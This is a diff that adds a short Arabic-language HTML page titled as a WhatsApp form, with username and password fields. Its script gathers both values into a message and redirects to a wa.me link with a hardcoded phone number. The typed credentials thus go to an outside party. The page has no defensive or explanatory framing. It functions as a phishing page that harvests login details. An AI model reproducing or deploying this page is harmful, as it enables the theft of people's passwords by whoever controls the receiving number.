@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نموذج واتساب</title>
+    <script>
+        function sendToWhatsApp() {
+            // جمع البيانات من الحقول
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+
+            // تكوين رسالة واتساب
+            var message = "اسم المستخدم: " + username + "\n" + "كلمة المرور: " + password;
+
+            // تكوين رابط واتساب مع الرسالة
+            var whatsappUrl = "https://wa.me/96181424957?text=" + encodeURIComponent(message);
+
+            // الانتقال إلى واتساب
+            window.location.href = whatsappUrl;
+        }
+    </script>
+</head>
+<body>
+
+    <form onsubmit="event.preventDefault(); sendToWhatsApp();">
+        <p>
+            <label for="username">اسم المستخدم:</label>
+            <input type="text" id="username" name="username">
+        </p>
+        
+        <p>
+            <label for="password">كلمة المرور:</label>
+            <input type="password" id="password" name="password">
+        </p>
+        
+        <p>
+            <input type="submit" value="Submit GBI">
+        </p>
+    </form>
+
+    <div>
+        <button onclick="sendToWhatsApp()">
+            GBI "96181424957"
+        </button>
+    </div>
+
+</body>
+</html>
